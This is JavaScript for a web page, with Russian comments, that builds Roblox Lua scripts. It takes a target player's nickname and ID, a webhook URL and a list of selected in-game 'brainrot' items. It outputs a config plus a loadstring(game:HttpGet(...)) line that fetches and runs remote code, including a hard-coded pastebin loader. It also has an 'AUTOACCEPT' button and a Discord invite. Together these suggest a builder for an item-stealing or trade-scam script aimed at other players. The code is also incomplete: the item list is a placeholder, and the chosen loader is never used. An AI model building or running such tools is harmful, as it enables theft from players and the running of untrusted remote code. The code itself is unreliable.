// ВСЕ БРЕЙНРОТЫ (список сокращён для читаемости, но у тебя он полный)
const allBrainrots = [ /* ... полный список из предыдущего сообщения ... */ ];

function populateBrainrotsList() {
    const container = document.getElementById('brainrotsList');
    container.innerHTML = '';
    allBrainrots.forEach(br => {
        const label = document.createElement('label');
        label.className = 'checkbox-item';
        const cb = document.createElement('input');
        cb.type = 'checkbox';
        cb.value = br;
        const span = document.createElement('span');
        span.textContent = br;
        label.appendChild(cb);
        label.appendChild(span);
        container.appendChild(label);
    });
}

document.getElementById('searchBrainrots').addEventListener('input', (e) => {
    const term = e.target.value.toLowerCase();
    document.querySelectorAll('.checkbox-item').forEach(item => {
        const text = item.querySelector('span').textContent.toLowerCase();
        item.style.display = text.includes(term) ? 'flex' : 'none';
    });
});

document.getElementById('selectAllBtn').onclick = () => {
    document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = true);
};

document.getElementById('deselectAllBtn').onclick = () => {
    document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = false);
};

document.querySelectorAll('input[name="scriptType"]').forEach(radio => {
    radio.addEventListener('change', () => {
        const customArea = document.getElementById('customScript');
        if (radio.value === 'custom') {
            customArea.style.display = 'block';
        } else {
            customArea.style.display = 'none';
        }
    });
});

document.getElementById('generateBtn').addEventListener('click', () => {
    const nick = document.getElementById('robloxNick').value.trim() || "";
    const userId = document.getElementById('robloxId').value.trim() || "";
    const webhook = document.getElementById('webhookUrl').value.trim();
    const scriptType = document.querySelector('input[name="scriptType"]:checked').value;
    const customScript = document.getElementById('customScript').value;

    const selected = [];
    document.querySelectorAll('#brainrotsList input:checked').forEach(cb => selected.push(cb.value));

    if (selected.length === 0) {
        alert('Select at least one brainrot');
        return;
    }
    if (!webhook) {
        alert('Enter Webhook URL');
        return;
    }

    let loadLine = '';
    if (scriptType === '22s') {
        loadLine = 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()';
    } else if (scriptType === 'custom') {
        loadLine = customScript;
    }

    const brainrotListStr = "{\n    " + selected.map(br => `"${br}"`).join(",\n    ") + "\n}";

    const finalScript = `-- ========== CONFIG ==========
local CONFIG = {
    TARGET_USER_ID = "${userId}",
    TARGET_NAME = "${nick}",
    WEBHOOK_URL = "${webhook}",
    TARGET_BRAINROTS = ${brainrotListStr}
}
-- ========== END CONFIG ==========

-- Load main script
loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()`;

    document.getElementById('scriptOutput').textContent = finalScript;
    document.getElementById('output').style.display = 'block';
    const copyBtn = document.getElementById('copyBtn');
    copyBtn.style.display = 'inline-flex';
});

document.getElementById('copyBtn').addEventListener('click', () => {
    const text = document.getElementById('scriptOutput').textContent;
    navigator.clipboard.writeText(text);
    alert('Copied to clipboard!');
});

document.getElementById('discordBtn').addEventListener('click', () => {
    window.open('https://discord.gg/9A6x27c9k6', '_blank');
});

document.getElementById('autoacceptBtn').addEventListener('click', () => {
    navigator.clipboard.writeText("AUTOACCEPT");
    alert('AUTOACCEPT copied to clipboard!');
});

populateBrainrotsList();
